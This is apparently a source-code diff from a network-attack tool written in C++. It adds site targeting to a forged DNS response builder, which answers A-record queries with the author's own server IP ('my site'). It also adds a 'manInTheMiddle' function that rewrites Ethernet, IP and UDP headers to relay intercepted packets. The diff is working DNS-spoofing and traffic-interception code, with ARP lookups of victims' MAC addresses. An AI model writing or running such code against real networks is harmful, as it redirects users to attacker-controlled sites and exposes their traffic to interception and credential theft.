@@ -157,6 +157,8 @@ size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
 		query[i].name = (uint8_t*)&qDNS[sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize];
 		query[i].question = (DNS_question*)&qDNS[sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) +
 			qsize + (strlen((const char*)query[i].name) + 1)];
+		if (query[i].question->qtype != htons(1) || !checkForWantedSite((char*)query[i].name, info))
+			return -1;
 		qsize += (strlen((const char*)query[i].name) + 1) + sizeof(DNS_question);
 	}
 
@@ -169,14 +171,14 @@ size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
 	for (int i = 0; i < ntohs(dns.questions); i++)
 	{										/* 12 is the number of bytes untill the first name */
 		if(i > 0)
-		records[i].name = (uint8_t*)htons((ptr | (12 + strlen((const char*)query[i-1].name) + 1) + sizeof(DNS_question)));	// pointing to the name
+			records[i].name = (uint8_t*)htons((ptr | (12 + strlen((const char*)query[i-1].name) + 1) + sizeof(DNS_question)));	// pointing to the name
 		records[i].name = (uint8_t*)htons((ptr | 12));
 		records[i].resource = &answer;
 		*((uint32_t*)&records[i].rdata) = inet_addr((const char*)info.ipv4);
 		rsize +=  htons(answer.data_len) + sizeof(DNS_answer) + sizeof(uint8_t*);
 	}
 
-	uint8_t* mac = getARPinformation(ip.ip_srcaddr, info);
+	uint8_t* mac = getARPinformation(ip.ip_srcaddr);
 	if (!mac)
 		return 0;
 
@@ -196,7 +198,6 @@ size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
 		(uint8_t*)destaddr,
 		ip.ip_id
 	);
-	std::cout << "size: " << qsize << std::endl;
 
 	createDNSResponseHeader(
 		raw_packet,
@@ -214,7 +215,8 @@ size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
 	}
 
 	size_t recsize = 4 + 1 + sizeof(DNS_answer);
-	uint32_t nip = inet_addr((const char*)info.ipv4);
+	uint32_t nip = inet_addr((const char*)info.ipv4); // ip of the site they are "looking for" (my site)
+	
 	for (int i = 0; i < ntohs(dns.questions); i++)
 	{
 		memcpy((uint8_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize + recsize*i],
@@ -235,6 +237,26 @@ size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
 
 	return sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) +
 		sizeof(DNS_header) + qsize + rsize;
+}
+
+size_t manInTheMiddle(char* raw_packet, uint8_t* mitm_packet, uint8_t* dstMAC, uint16_t dstPort, uint32_t dstIP, AddressInfo& info)
+{	
+	Ethernet_header* pEther = (Ethernet_header*)mitm_packet;
+	memcpy(pEther->dest_addr, dstMAC, 6);
+	pEther->frame_type = htons(0x0800);
+	
+	IP_header* pIP = (IP_header*)raw_packet;
+	pIP->ip_destaddr = dstIP;
+	pIP->ip_srcaddr = inet_addr((char*)info.ipv4);
+
+	memcpy(pEther->src_addr, info.byteMac, 6);
+
+	UDP_header* pUDP = (UDP_header*)&raw_packet[sizeof(IP_header)];
+	pUDP->dst_port = htons(dstPort);
+
+	memcpy(&mitm_packet[sizeof(Ethernet_header)], raw_packet, ntohs(pIP->ip_total_length));
+
+	return ntohs(pIP->ip_total_length) + sizeof(Ethernet_header);
 }
 
 void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP)
